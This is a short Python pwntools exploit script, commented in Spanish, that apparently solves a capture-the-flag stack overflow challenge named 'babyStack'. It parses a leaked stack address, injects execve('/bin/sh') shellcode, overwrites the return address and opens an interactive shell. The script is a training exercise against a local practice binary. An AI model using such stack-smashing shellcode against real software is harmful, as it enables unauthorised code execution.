#!/usr/bin/env python3

from pwn import *

s = process('./babyStack')

context.update(arch="amd64", os="linux") # importante al usar asm

s.recvline() # Bienvenido n00b!
leak_addr = int(s.recvline()[54:-4],16) # reconoces esta direccion?
s.recvuntil('\n') # que me dices?

offset = 24

sc = ''
sc += 'mov al, 0x3b\n' # execve
sc += 'mov rdi, {}\n'.format(hex(leak_addr+0x20)) # return addr
sc += 'xor rsi, rsi\n'
sc += 'xor rdx, rdx\n'
sc += 'syscall' # call /bin/sh

shellcode = asm(sc)

print('shellcode length: '+str(len(shellcode)))

if (len(shellcode) > 24):
    print("Shellcode muy grande")
else:
    print("Goo!")

payload = shellcode
payload += b"A"*(offset-len(shellcode))
payload += p64(leak_addr)
payload += '/bin/sh\x00'

s.sendline(payload)
s.interactive()
